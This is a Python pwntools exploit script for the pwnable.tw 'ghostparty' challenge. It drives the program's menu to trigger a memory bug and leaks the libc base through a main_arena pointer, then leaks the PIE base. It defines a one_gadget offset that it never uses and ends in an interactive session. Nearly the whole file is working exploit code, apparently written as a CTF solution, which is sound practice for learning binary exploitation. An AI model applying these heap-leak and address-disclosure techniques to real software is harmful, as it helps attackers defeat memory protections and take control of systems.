from pwn import *

r = process('./ghostparty')#, env={'LD_PRELOAD': './libc.so.6'})
#r = remote('chall.pwnable.tw', 10401)
has_attr = ['2' ,'7']

join = '1'
give_up = '2'
join_hear = '3'

def add_ghost(name, age, msg, tp, act, attr=None, stop=False):
    r.sendlineafter(':', '1')
    r.sendlineafter(':', name)
    r.sendlineafter(':', age)
    r.sendlineafter(':', msg)
    r.sendlineafter(':', tp)
    if tp in has_attr:
        r.sendlineafter(':', attr)

    r.sendlineafter(':', act)

def rm_ghost(idx):
    r.sendlineafter(':', '4')
    r.sendlineafter('party :', str(idx))

main_arena_offset = 0x3c3b20
one_gadget_offset = 0xef6c4

add_ghost('leak', '55', '55', '7', join_hear, '5'*0x80)
add_ghost('leak2', '55', '55', '7', join, '')
# leak libc
r.sendlineafter(':', '2')
r.sendlineafter('party :', '1')
r.recvuntil('Blood : ')
libc = u64(r.recvn(6).ljust(8, '\x00'))-88-main_arena_offset
log.info('libc: '+hex(libc))

add_ghost('useless', '55', '55', '7', join, 'a'*0x10)
add_ghost('useless', '55', '55', '7', join, 'b')

r.sendlineafter(':', '2')
r.sendlineafter(':', '0')
r.recvuntil('Blood : ')
PIE = u64(r.recvn(6).ljust(8,'\x00')) - 0x2109d8

log.info('PIE: %x' % PIE)

r.interactive()
